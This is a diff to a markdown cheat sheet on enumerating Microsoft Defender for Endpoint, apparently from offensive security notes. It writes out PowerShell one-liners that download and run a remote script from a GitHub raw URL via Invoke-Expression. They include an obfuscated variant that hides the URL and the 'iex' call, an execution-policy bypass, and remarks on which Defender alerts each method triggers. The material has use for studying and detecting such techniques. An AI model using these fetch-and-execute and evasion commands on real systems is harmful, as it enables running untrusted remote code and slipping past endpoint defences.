@@ -41,25 +41,20 @@ Enumeration of MDE
 ## Enumeration of MDE
 ### Defender for Endpoint
 
-A collection of enumeration procedures.
 
-* fkmde.ps1
+
+#### fkmde.ps1 can be run with multiple parameters and modes to suit different use cases and operational environments. 
   ```powershell
+  // basic method with iex
   Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1')
-  ```
 
-* fkmde.ps1 with parameters through RestMethod
-  ```powershell
+  // parameterized mode with iex and irm
   Invoke-Expression "& { $(Invoke-RestMethod https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1) } --enum C:\Windows 3"
-  ```
 
-* ps1-obfuscator and fkmde.ps1:
-  ```powershell
+  // obfuscated execution with ps1-obfuscator seen in the wild
   powershell -Command "new-alias ravnl curl; $bcutn = @(8891,8903,8903,8899,8902,8845,8834,8834,8901,8884,8906,8833,8890,8892,8903,8891,8904,8885,8904,8902,8888,8901,8886,8898,8897,8903,8888,8897,8903,8833,8886,8898,8896,8834,8889,8894,8907,8887,8901,8834,8889,8894,8896,8887,8888,8834,8896,8884,8892,8897,8834,8889,8894,8896,8887,8888,8833,8899,8902,8836); $qsnln = ''; foreach ($asciiValue in $bcutn) { $decodedChar=[char]($asciiValue-8787); $qsnln+=$decodedChar; }; .([char](9992-9887)+'e'+'x')(ravnl -useb $qsnln)"
-  ```  
 
-* fkmde.ps1 with -nop bypass, but it will get flagged as Medium Incident - Multi-stage incident involving Execution & Discovery
-  ```powershell
+  // bypass execution (this will get flagged in Defender as Medium Incident - Multi-stage incident involving Execution & Discovery)
   powershell -nop -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1')"
   ```
 
@@ -74,7 +69,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 > However, this trick does not work when the execution policy is enforced through a GPO. In this case, after starting a new PowerShell session, you can load the script as follows.
 
 ```powershell
-Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
+Get-Content .\fkmde.ps1 | Out-String | Invoke-Expression
 ```
 
 ## ASR Rules
